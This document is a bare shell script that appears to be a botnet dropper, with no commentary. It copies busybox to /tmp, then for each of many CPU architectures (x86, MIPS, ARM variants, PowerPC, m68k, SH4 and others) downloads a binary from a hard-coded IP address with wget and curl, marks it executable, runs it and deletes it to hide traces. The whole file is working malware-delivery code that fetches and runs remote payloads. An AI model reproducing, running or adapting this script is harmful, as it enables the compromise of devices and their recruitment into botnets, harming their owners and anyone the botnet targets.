#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_x86; curl -O http://92.112.125.6/main_x86; chmod +x *; ./main_x86 main_x86; rm -rf main_x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_mips; curl -O http://92.112.125.6/main_mips; chmod +x *; ./main_mips main_mips; rm -rf main_mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_arc; curl -O http://92.112.125.6/main_arc; chmod +x *; ./main_arc main_arc; rm -rf main_arc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_i686; curl -O http://92.112.125.6/main_i686; chmod +x *; ./main_i686 main_i686; rm -rf main_i686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_x86_64; curl -O http://92.112.125.6/main_x86_64; chmod +x *; ./main_x86_64 main_x86_64; rm -rf main_x86_64
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_mpsl; curl -O http://92.112.125.6/main_mpsl; chmod +x *; ./main_mpsl main_mpsl; rm -rf main_mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_arm; curl -O http://92.112.125.6/main_arm; chmod +x *; ./main_arm main_arm; rm -rf main_arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_arm5; curl -O http://92.112.125.6/main_arm5; chmod +x *; ./main_arm5 main_arm5; rm -rf main_arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_arm6; curl -O http://92.112.125.6/main_arm6; chmod +x *; ./main_arm6 main_arm6; rm -rf main_arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_arm7; curl -O http://92.112.125.6/main_arm7; chmod +x *; ./main_arm7 main_arm7; rm -rf main_arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_ppc; curl -O http://92.112.125.6/main_ppc; chmod +x *; ./main_ppc main_ppc; rm -rf main_ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_spc; curl -O http://92.112.125.6/spmain_spcc; chmod +x *; ./main_spc main_spc; rm -rf main_spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_m68k; curl -O http://92.112.125.6/main_m68k; chmod +x *; ./main_m68k main_m68k; rm -rf main_m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.112.125.6/main_sh4; curl -O http://92.112.125.6/main_sh4; chmod +x *; ./main_sh4 main_sh4; rm -rf main_sh4
